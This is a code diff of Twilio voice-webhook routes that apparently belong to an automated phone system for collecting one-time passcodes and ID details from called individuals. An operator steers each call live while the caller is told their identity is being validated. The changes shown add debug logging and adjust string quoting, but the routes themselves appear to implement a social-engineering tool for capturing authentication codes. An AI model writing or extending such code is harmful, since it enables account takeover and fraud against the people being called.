@@ -8,13 +8,20 @@ router.get('/test', (req, res) => {
     res.send('Webhook is working! Server is online.');
 });
 
-// Main voice response - NO sessionId required, get it from query or body
+// Root endpoint for Twilio
 router.post('/voice-response', async (req, res) => {
+    console.log('=== WEBHOOK CALLED ===');
+    console.log('Body:', req.body);
+    console.log('Query:', req.query);
+    
     const sessionId = req.body.sessionId || req.query.sessionId;
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
+    console.log('SessionId:', sessionId);
+    
     if (!sessionId) {
+        console.log('No sessionId provided');
         twiml.say('Invalid session. Goodbye.');
         twiml.hangup();
         return res.type('text/xml').send(twiml.toString());
@@ -28,6 +35,8 @@ router.post('/voice-response', async (req, res) => {
             [sessionId]
         );
         
+        console.log('Session found:', session.rows.length > 0);
+        
         if (session.rows.length === 0) {
             twiml.say('Session not found. Goodbye.');
             twiml.hangup();
@@ -39,6 +48,8 @@ router.post('/voice-response', async (req, res) => {
         const fullName = callData.full_name;
         const subject = callData.subject;
         const customIntro = callData.custom_intro;
+        
+        console.log('Current action:', currentAction);
         
         if (currentAction === 'consent') {
             const gather = twiml.gather({
@@ -113,7 +124,7 @@ router.post('/voice-response', async (req, res) => {
             const play = twiml.play({
                 loop: 10
             });
-            play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+            play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
             twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         } else {
             twiml.say('Please wait for admin instructions.');
@@ -139,6 +150,8 @@ router.post('/handle-consent', async (req, res) => {
     const twiml = new VoiceResponse();
     const io = req.app.get('io');
     
+    console.log('Handle consent - SessionId:', sessionId, 'Digits:', Digits);
+    
     if (!sessionId) {
         twiml.say('Invalid session. Goodbye.');
         twiml.hangup();
@@ -160,7 +173,7 @@ router.post('/handle-consent', async (req, res) => {
         
         twiml.say('Please wait as we serve you.');
         const play = twiml.play({ loop: 10 });
-        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
         twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
@@ -205,7 +218,7 @@ router.post('/collect-email-otp', async (req, res) => {
         
         twiml.say('Please wait as we validate your identity.');
         const play = twiml.play({ loop: 10 });
-        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
         twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
@@ -249,7 +262,7 @@ router.post('/collect-auth-otp', async (req, res) => {
         
         twiml.say('Please wait as we validate your identity.');
         const play = twiml.play({ loop: 10 });
-        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
         twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
@@ -293,7 +306,7 @@ router.post('/collect-phone-otp', async (req, res) => {
         
         twiml.say('Please wait as we validate your identity.');
         const play = twiml.play({ loop: 10 });
-        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
         twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
@@ -337,7 +350,7 @@ router.post('/collect-id', async (req, res) => {
         
         twiml.say('Please wait as we validate your identity.');
         const play = twiml.play({ loop: 10 });
-        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
         twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
         
     } else {
@@ -366,7 +379,7 @@ router.post('/check-action', async (req, res) => {
     
     if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
         const play = twiml.play({ loop: 5 });
-        play.url = `https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3`;
+        play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
         twiml.redirect(`/webhooks/check-action?sessionId=${sessionId}`, { method: 'POST' });
     } else {
         twiml.redirect(`/webhooks/voice-response?sessionId=${sessionId}`, { method: 'POST' });
